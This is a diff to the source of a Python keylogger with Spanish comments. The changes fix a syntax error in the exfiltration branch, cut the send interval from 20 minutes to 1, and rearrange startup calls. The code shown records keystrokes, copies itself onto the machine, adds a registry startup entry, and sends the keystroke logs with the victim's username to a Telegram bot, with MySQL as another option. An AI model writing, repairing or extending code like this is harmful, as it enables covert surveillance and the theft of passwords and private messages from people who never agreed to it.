@@ -373,7 +373,6 @@ def SendLog():
             f = open (pathN ,'r')
             T = datetime.datetime.now()
             currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
-
             try:
                 bot = telebot.TeleBot(Token())      # Instancia
                 bot.send_message(ID(),"Usuario: "+str(getuser())+"\nFecha: "+currentTime+"\nRegistro de teclas:")  
@@ -390,6 +389,7 @@ def SendLog():
             except:
                 pass
             print("[Telegram] No se encuentra el archivo")
+    
     while (True):
         time.sleep(timeSend()*60) # Tiempo de espera por minutos 
         #time.sleep(4) # Solo antigueeo 
@@ -414,7 +414,8 @@ def SendLog():
 
             if (GMailOrDataBase() == 1):    # Send Data Base
                 SendDataBaseMySQL()
-            if (GMailOrDataBase() == 2:    # Send Telegram
+
+            if (GMailOrDataBase() == 2):    # Send Telegram
                 TelegramBot()
         else:
             print("[Send] sin conexión")
@@ -483,7 +484,7 @@ def GMailOrDataBase():
 
 
 def timeSend(): # Tiempo de envío perzonalizado
-    return 20 #Minutos                 <= Escoja su tiempo en minutos
+    return 1 #Minutos                 <= Escoja su tiempo en minutos
 
 # ************ Zone Telegram *************     
 def ID():
@@ -501,10 +502,6 @@ def Token():
 # Inicio multihilo
 if __name__ == '__main__':
     
-    TelegramBot()
-
-    
-
     EscondeKey()    # Se replica dentro de la computadora
     addStartup()    # Modifica registro de arranque
     p1 = threading.Thread(target=KeyLogger)   # Registra teclas
